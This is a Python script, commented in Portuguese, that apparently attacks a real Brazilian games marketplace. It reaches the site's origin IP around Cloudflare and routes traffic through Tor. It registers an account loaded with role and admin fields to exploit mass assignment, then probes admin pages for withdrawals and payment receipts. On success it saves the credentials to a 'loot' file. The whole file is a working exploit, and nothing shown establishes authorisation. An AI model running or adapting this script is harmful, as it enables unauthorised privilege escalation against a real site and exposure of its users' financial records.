#!/usr/bin/env python3
"""
/cadastro mass assignment test — desapegogames.com.br via bypass CF (.54)
Cria conta de teste com campos de role/privilegio e verifica se ganha acesso /admin/.
Nao-destrutivo: conta de teste isolada, read-only apos login (nao modifica dados).
"""
import sys, time, random, requests, urllib3
urllib3.disable_warnings()
PROXY={"https":"socks5://127.0.0.1:9050","http":"socks5://127.0.0.1:9050"}
BASE="https://186.226.60.54"
HOSTH="desapegogames.com.br"
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36"

TS=str(int(time.time()))
USER=f"pttst{TS}ma"   # mass-assignment test user (sem underscore, so letras+digits)
EMAIL=f"{USER}@protonmail.com"
PW="Pentest@2026"

# Campos de privilegio a testar (mass assignment)
ROLE_FIELDS = {
    "role":"1","isAdmin":"1","is_admin":"1","admin":"1",
    "tipo":"admin","nivel":"1","status":"admin","permissao":"admin",
    "nivel_acesso":"1","privilegios":"admin","perfil":"admin",
    "group":"1","grupo":"admin","tipo_usuario":"admin",
}

def hdr():
    return {"Host":HOSTH,"User-Agent":UA}

print(f"[*] mass assignment test — user={USER} email={EMAIL}")
print(f"[*] campos de role testados: {list(ROLE_FIELDS.keys())}")

# 1. Cadastro B com campos role
sess=requests.Session(); sess.proxies.update(PROXY)
data={
    "nome":"Teste Pentest MA","usuario":USER,"email":EMAIL,
    "senha":PW,"confirmarsenha":PW,
}
data.update(ROLE_FIELDS)
print(f"\n[A] POST /cadastro com {len(data)} campos (incl. role fields)")
r=sess.post(f"{BASE}/cadastro",headers=hdr(),data=data,verify=False,timeout=30,allow_redirects=False)
print(f"    -> HTTP {r.status_code} Location={r.headers.get('Location','')!r}")
cadastro_ok = r.status_code in (301,302,303,307,308)
if r.status_code==200:
    # erro de validacao
    body=r.content.decode('utf-8',errors='replace')
    import re
    errs=re.findall(r'<div[^>]*class=\"[^\"]*text-danger[^\"]*\"[^>]*>(.*?)</div>',body,re.DOTALL)
    for e in errs[:5]:
        t=re.sub(r'<[^>]+>','',e).strip()
        if t: print("    ERR:",t[:200])

# 2. Login B
print(f"\n[B] POST /login com {USER}")
r=sess.post(f"{BASE}/login",headers=hdr(),data={"login":USER,"senha":PW},verify=False,timeout=30,allow_redirects=False)
print(f"    -> HTTP {r.status_code} Location={r.headers.get('Location','')!r}")
login_ok = r.status_code in (301,302,303,307,308)
print(f"    cookies: {dict(sess.cookies)}")
if b'confere' in (r.content or b''):
    print("    (msg 'confere' presente = falha)")

# 3. Acessar /painel (conta comum)
print(f"\n[C] GET /painel (logado?)")
r=sess.get(f"{BASE}/painel",headers=hdr(),verify=False,timeout=30,allow_redirects=False)
print(f"    -> HTTP {r.status_code} Location={r.headers.get('Location','')!r} len={len(r.content)}")
body_painel=r.content

# 4. Acessar /admin/ (CRITICO: se 200 = MASS ASSIGNMENT CONFIRMADO)
print(f"\n[D] GET /admin/ (teste de privilegio)")
r=sess.get(f"{BASE}/admin/",headers=hdr(),verify=False,timeout=30,allow_redirects=False)
print(f"    -> HTTP {r.status_code} Location={r.headers.get('Location','')!r} len={len(r.content)}")
admin_status=r.status_code
admin_loc=r.headers.get('Location','')
body_admin=r.content

# 5. Acessar /admin/autenticacao/login (confirma se redirect e para login)
print(f"\n[E] GET /admin/autenticacao/login")
r=sess.get(f"{BASE}/admin/autenticacao/login",headers=hdr(),verify=False,timeout=30,allow_redirects=False)
print(f"    -> HTTP {r.status_code} Location={r.headers.get('Location','')!r} len={len(r.content)}")

# 6. Acessar endpoints admin especificos (read-only)
print(f"\n[F] GET /admin/saques (read-only)")
r=sess.get(f"{BASE}/admin/saques",headers=hdr(),verify=False,timeout=30,allow_redirects=False)
print(f"    -> HTTP {r.status_code} Location={r.headers.get('Location','')!r} len={len(r.content)}")
print(f"\n[G] GET /admin/comprovantes")
r=sess.get(f"{BASE}/admin/comprovantes",headers=hdr(),verify=False,timeout=30,allow_redirects=False)
print(f"    -> HTTP {r.status_code} Location={r.headers.get('Location','')!r} len={len(r.content)}")

print("\n=== CONCLUSAO ===")
if admin_status==200 and b'autenticacao' not in body_admin[:2000]:
    print("[+] *** MASS ASSIGNMENT CONFIRMADO *** — conta criada c/ campos role ganhou acesso /admin/")
    with open("loot/creds.txt","a") as cf:
        cf.write(f"MASS ASSIGNMENT admin | {USER}:{PW} | /admin/ acessivel (role escalado)\n")
    with open("loot/access.txt","a") as af:
        af.write(f"admin via mass assignment | user={USER} pw={PW} | /admin/ 200\n")
elif admin_status in (307,302,303):
    print("[-] Mass assignment NEGADO — /admin/ redirect para login (sem privilegio)")
else:
    print(f"[?] /admin/ retornou {admin_status} — investigar")

# salvar evidencias
import os
os.makedirs("enum/massassign",exist_ok=True)
with open(f"enum/massassign/cadastro_B_resp.html","wb") as f: 
    pass  # ja printado
with open("enum/massassign/painel_B.html","wb") as f: f.write(body_painel)
with open("enum/massassign/admin_B.html","wb") as f: f.write(body_admin)
print(f"\n[*] user de teste: {USER} (senha {PW}) — conta criada para validacao")
